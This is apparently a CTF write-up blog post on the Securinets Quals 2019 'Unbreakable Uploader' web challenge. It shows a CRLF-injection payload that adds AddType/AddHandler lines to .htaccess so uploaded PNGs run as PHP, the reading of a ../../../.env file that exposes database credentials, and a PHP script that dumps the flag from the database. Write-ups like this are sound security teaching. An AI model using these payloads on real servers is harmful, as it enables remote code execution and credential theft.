---
layout: post
title: Unbreakable Uploader
category: Securinets Prequals 2019
---

Hello folks , this time we played Securinets CTF Quals 2019 for 24 hours

I will try to explain the latest Web Unbreakable Uploader challenge (2 solves)

Its amazing task where you need to chain multi bugs to get RCE 

OK lets start

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/54940468-11109c00-4f2b-11e9-84ad-dcdd1e074393.png"></p>

We must exploit the unknown vulnerability (for the moment), access this database of challenges and find the hidden FLAG :D

Not bad at all guys, challenge accepted!

So as far as we can do :
```
  1-Upload any jpeg/png file
  2-Deny / Allow access to our uploads folder (every user has his own folder : https://web3.ctfsecurinets.com//md5($_SERVER['REMOTE_ADDR'])/md5(random_string).extension )
```
Example to deny access to our folder files

We just can input "all" or "0.0.0.0" and set Action to deny then ADD

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/54941766-eb38c680-4f2d-11e9-8563-4309418ce71d.png"></p>

We are trying to access our uploaded image, we can confirm that the Deny action is working properly

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/54941817-0dcadf80-4f2e-11e9-9df3-642738d113f5.png"></p>

First, when we look at this task and read the name of the challenge, we say it is a basic upload bypass.

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/54940608-53d27400-4f2b-11e9-8c0e-931de5237264.png"></p>

After trying for more than 1h to bypass this upload , try normal stuff to break the upload check and upload php file or inject php in png IDAT chunks and other tricky way but we failed :(

Admin this moment be like

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/54941131-64cfb500-4f2c-11e9-8c6a-e4b4e55d8791.jpg"></p>

Ok here we start to take things more serious !

Lets begin again 

We have deny / allow process , what it can be ? 

```
1-Nginx module
2-.htaccess
3-or maybe something else!
```

So we said why not play with the configuration itself, if we could inject another configuration line on these files, we might be able to bypass upload.

```
Exp : 
AddType application/x-httpd-php .png
AddHandler application/x-httpd-php .png
the AddType in an .htaccess file can tell the server to run png extension as PHP
```

So we need to make CRLF injection to create new line , what we want to do :

```
allow from OUR_INPUT <-- inject input that create new line in config file
```

So basically if we can injection new lines we are done here :D

```
to inject this 
0.0.0.0 AddType application/x-httpd-php .png AddHandler application/x-httpd-php .png
```

To be this one 
```
allow from 0.0.0.0
AddType application/x-httpd-php .png
AddHandler application/x-httpd-php .png
```

we should encode our input and do CRLF injection using %0d%0a as simple way

```
We get this payload as input :
0.0.0.0%0d%0aAddType%20application%2Fx-httpd-php%20.png%0d%0aAddHandler%20application%2Fx-httpd-php%20.png

%0d%0a: CRLF
```

Inject php code inside png file and try to upload it .

Lets check before / after 

This one before inject our payload :  

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/54944722-71f0a200-4f34-11e9-8233-b0ab121b7b7c.png"></p>

And this after inject :

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/54944718-71580b80-4f34-11e9-9142-9f9edeb235d2.png"></p>

Ok here we are done , next please :D

Lets do some RCE Stuff

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/54944939-f4796180-4f34-11e9-9e94-b795c6a053eb.png"></p>

```
cat ../../../.env | less

# Configure your db driver and server_version in config/packages/doctrine.yaml
DATABASE_URL=mysql://symfony_admin:Securinets_dB_P455W0Rd_369@127.0.0.1:3306/symfony_task_3

```
<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/54945228-9c8f2a80-4f35-11e9-832a-cc35b8aa24b6.jpg"></p>


Trying to connect to database  "Connection error to database" , it was fake database name "symfony_task_3"

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/54945550-6ef6b100-4f36-11e9-87e5-bc66deda8804.jpeg"></p>

Lets just dump user privileges database XD

Find database name : big_database 

So lets find flag and win :)

```
<?php

$link = mysqli_connect("localhost", "symfony_admin", "Securinets_dB_P455W0Rd_369", "big_database");
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
$r = mysqli_query($link,"SELECT * FROM user_details WHERE username like '%ecurinets%' or first_name like '%ecurinets%' or last_name like '%ecurinets%' or gender like '%ecurinets%' or password like '%ecurinets%'");
echo mysqli_error($link);
var_dump(mysqli_fetch_all($r));
?>
```

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/54946477-6bfcc000-4f38-11e9-9853-f2c1ee85efbb.png"></p>

And we are done FLAG : Securinets{T00_MuCh_W0rk}

Thank you for reading this write up , well done for my team @DefConUA 1st place with 2 remaining tasks :)
And Thanks to the creator's team for this CTF, especially the Emperor, for this amazing task :)


<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/54945895-31465800-4f37-11e9-80cc-bbc98fd96e5f.png"></p>
